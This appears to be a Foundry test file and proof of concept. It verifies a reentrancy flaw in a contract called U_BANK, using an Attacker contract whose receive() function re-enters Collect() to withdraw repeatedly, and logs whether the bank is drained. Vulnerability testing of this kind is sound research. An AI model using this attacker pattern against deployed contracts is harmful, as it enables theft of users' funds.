// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol";

contract ReentrancyTest is Test {
    U_BANK public bank;
    Log public customLog;
    Attacker public attacker;

    function setUp() public {
        // Deploy Log contract
        customLog = new Log();
        
        // Deploy U_BANK contract with Log address
        bank = new U_BANK(address(customLog));
        
        // Deploy attacker contract
        attacker = new Attacker(address(bank));
        
        // Fund attacker contract for deposit
        vm.deal(address(attacker), 2 ether);
    }

    function testReentrancy() public {
        // Deposit from attacker to U_BANK contract
        vm.prank(address(attacker));
        attacker.deposit{value: 2 ether}();
        
        // Advance time to pass unlock time
        vm.warp(block.timestamp + 1);
        
        // --- BEFORE ATTACK ---
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        (uint256 attackerAccBalanceBefore, ) = bank.Acc(address(attacker));
        
        console.log("Bank ETH balance before:", bankBalanceBefore);
        console.log("Attacker ETH balance before:", attackerBalanceBefore);
        console.log("Attacker deposit balance before:", attackerAccBalanceBefore);
        
        // --- TRIGGER ATTACK ---
        console.log("--- Trigger Attack ---");
        vm.prank(address(attacker));
        attacker.attack();
        console.log("Attack executed");
        
        // --- AFTER ATTACK ---
        console.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        (uint256 attackerAccBalanceAfter, ) = bank.Acc(address(attacker));
        
        console.log("Bank ETH balance after:", bankBalanceAfter);
        console.log("Attacker ETH balance after:", attackerBalanceAfter);
        console.log("Attacker deposit balance after:", attackerAccBalanceAfter);
        
        // --- DIFFERENTIAL REPORT ---
        console.log("--- DIFFERENTIAL REPORT ---");
        bool bankDrained = (bankBalanceAfter == 0);
        uint256 stolenAmount = attackerBalanceAfter - attackerBalanceBefore;
        uint256 removedDeposit = attackerAccBalanceBefore - attackerAccBalanceAfter;
        bool depositMatchStolen = removedDeposit == stolenAmount;
        
        console.log("Bank drained:", bankDrained ? "YES" : "NO");
        console.log("ETH stolen from bank:", stolenAmount);
        console.log("Deposit removed:", removedDeposit);
        console.log("Stolen amount matches deposit:", depositMatchStolen ? "YES" : "NO");
        
        bool reentrancySuccess = bankDrained && depositMatchStolen && (stolenAmount == 2 ether);
        
        // Final verdict
        if(reentrancySuccess) {
            console.log("Vulnerability Exists: Successful reentrancy attack drained bank funds");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed to drain funds");
        }
        
        // Original assertions
        assertEq(address(bank).balance, 0, "Bank balance not drained");
        assertEq(address(attacker).balance, 2 ether, "Attacker balance incorrect");
    }
}

contract Attacker {
    U_BANK public bank;
    uint256 private count;

    constructor(address _bankAddr) {
        // Explicit payable conversion for U_BANK instance
        bank = U_BANK(payable(_bankAddr));
    }

    // Deposit into U_BANK
    function deposit() public payable {
        bank.Put{value: msg.value}(0);
    }

    // Initiate first withdrawal
    function attack() public {
        bank.Collect(1 ether);
    }

    // Receive function for reentrancy
    receive() external payable {
        if (count < 1 && address(bank).balance >= 1 ether) {
            count++;
            // Reenter to withdraw again
            bank.Collect(1 ether);
        }
    }
}